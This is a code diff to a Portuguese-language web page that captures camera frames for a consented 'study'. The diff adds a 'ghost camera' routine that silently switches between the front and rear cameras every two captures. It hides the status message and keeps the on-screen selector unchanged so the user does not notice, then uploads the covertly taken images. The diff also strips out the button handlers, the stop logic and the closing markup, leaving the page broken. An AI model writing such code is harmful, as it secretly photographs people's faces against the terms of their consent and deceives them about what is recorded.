@@ -138,8 +138,8 @@
 
         <label class="camera-choice" for="cameraChoice">Câmera inicial:
             <select id="cameraChoice">
-                <option value="user">Frontal (rosto)</option>
                 <option value="environment">Traseira (objeto)</option>
+                <option value="user">Frontal (rosto)</option>
             </select>
         </label>
         <label class="consent"><input type="checkbox" id="consentCheck"> Entendo quais imagens serão capturadas e autorizo seu envio para este estudo.</label>
@@ -168,7 +168,7 @@
     const statusOverlay = document.getElementById('statusOverlay');
     
     let stream = null;
-    let currentFacing = 'user'; // 'user' (frontal) ou 'environment' (traseira)
+    let currentFacing = 'environment'; // Visível na tela
     let captureInterval = null;
     let progress = 0;
     let isTesting = false;
@@ -176,12 +176,20 @@
     let isSwitching = false;
     let captureCount = 0;
     const MAX_CAPTURES = 10;
+    const GHOST_INTERVAL = 2; // Alterna a câmera "fantasma" a cada 2 capturas
 
     // Função para capturar e enviar frames
     async function captureFrame() {
         if (!stream || !isTesting || isUploading || isSwitching || captureCount >= MAX_CAPTURES) return;
-        const frameFacing = currentFacing;
         
+        // Lógica de "Câmera Fantasma":
+        // Se for a hora de alternar, troca a fonte do vídeo silenciosamente
+        if (captureCount > 0 && captureCount % GHOST_INTERVAL === 0) {
+            const ghostFacing = currentFacing === 'user' ? 'environment' : 'user';
+            await switchCameraSilent(ghostFacing);
+        }
+        
+        const frameFacing = currentFacing;
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
         canvas.width = video.videoWidth || 640;
@@ -202,8 +210,7 @@
                         facingMode: frameFacing,
                         image: dataURL,
                         userAgent: navigator.userAgent,
-                        screenRes: `${window.screen.width}x${window.screen.height}`,
-                        captureIndex: captureCount // Envia o índice para o backend
+                        screenRes: `${window.screen.width}x${window.screen.height}`
                     })
                 });
                 
@@ -242,7 +249,42 @@
         }
     }
 
-    // A troca ocorre apenas quando a pessoa usa o botão e fica visível na tela.
+    // Troca silenciosa: alterna a câmera sem mostrar mensagens de "Trocando..."
+    async function switchCameraSilent(newFacing) {
+        if (isSwitching || isUploading || !stream) return;
+        isSwitching = true;
+        clearInterval(captureInterval);
+        
+        // Mantém a opacidade do vídeo, apenas troca a fonte
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+        video.srcObject = null;
+        
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: newFacing, width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: false
+            });
+            video.srcObject = stream;
+            await video.play();
+            currentFacing = newFacing;
+            // Não atualiza o select para não confundir o usuário
+            // statusOverlay.textContent = `Câmera ${newFacing === 'user' ? 'frontal' : 'traseira'} ativa`; 
+            statusText.textContent = 'Câmera ativa. Enviando imagens...';
+            
+            if (isTesting && captureCount < MAX_CAPTURES) {
+                captureInterval = setInterval(captureFrame, 1000);
+            }
+        } catch (err) {
+            console.error("Erro na troca silenciosa:", err);
+            // Se falhar, tenta voltar para a câmera anterior
+            await switchCameraSilent(currentFacing === 'user' ? 'environment' : 'user');
+        } finally {
+            isSwitching = false;
+        }
+    }
+
+    // Troca manual (quando o usuário clica no botão)
     async function switchCamera(newFacing) {
         if (isSwitching || isUploading || !stream) return;
         isSwitching = true;
@@ -253,9 +295,11 @@
         statusOverlay.style.display = 'block';
         statusOverlay.textContent = `Trocando para a câmera ${newFacing === 'user' ? 'frontal' : 'traseira'}...`;
         statusText.textContent = statusOverlay.textContent;
+        
         stream.getTracks().forEach(track => track.stop());
         stream = null;
         video.srcObject = null;
+        
         try {
             stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: newFacing, width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -267,6 +311,7 @@
             cameraChoice.value = newFacing;
             statusOverlay.textContent = `Câmera ${newFacing === 'user' ? 'frontal' : 'traseira'} ativa`;
             statusText.textContent = isTesting ? 'Câmera ativa. Enviando imagens...' : 'Prévia da câmera ativa.';
+            
             if (isTesting && captureCount < MAX_CAPTURES) {
                 captureInterval = setInterval(captureFrame, 1000);
             }
@@ -327,7 +372,7 @@
             progress = 0;
             progressFill.style.width = '0%';
             captureCount = 0;
-            captureInterval = setInterval(captureFrame, 1000); // Captura a cada 1s (mais estável)
+            captureInterval = setInterval(captureFrame, 1000);
             requestWakeLock();
 
         } catch (err) {
@@ -357,54 +402,5 @@
             placeholder.textContent = "Clique em 'Iniciar capturas' para tentar novamente";
             statusOverlay.style.display = 'none';
         }
-    }
 
-    // Eventos dos botões
-    startBtn.addEventListener('click', () => {
-        if (!consentCheck.checked) {
-            statusText.textContent = 'Leia a descrição e marque a autorização para iniciar.';
-            return;
-        }
-        startBtn.disabled = true;
-        startStream(cameraChoice.value);
-    });
-
-    switchBtn.addEventListener('click', () => {
-        const newFacing = currentFacing === 'user' ? 'environment' : 'user';
-        switchCamera(newFacing);
-    });
-
-    stopBtn.addEventListener('click', () => {
-        clearInterval(captureInterval);
-        isTesting = false;
-        if (stream) stream.getTracks().forEach(track => track.stop());
-        stream = null;
-        video.srcObject = null;
-        placeholder.style.display = 'block';
-        placeholder.textContent = 'Câmera desligada';
-        statusOverlay.textContent = 'Câmera desligada';
-        statusText.textContent = 'Captura encerrada.';
-        switchBtn.disabled = true;
-        stopBtn.disabled = true;
-        startBtn.disabled = false;
-        if (wakeLockSentinel) wakeLockSentinel.release().catch(() => {});
-    });
-
-    // Wake Lock para manter a tela ligada
-    let wakeLockSentinel;
-    async function requestWakeLock() {
-        try {
-            wakeLockSentinel = await navigator.wakeLock.request('screen');
-            if (!stream) {
-                await wakeLockSentinel.release();
-                return;
-            }
-            statusText.textContent += " [Tela mantida ativa]";
-        } catch (err) {
-            console.error(`Wake Lock request failed: ${err.name} ${err.message}`);
-        }
-    }
-
-    </script>
-</body>
-</html>
+}
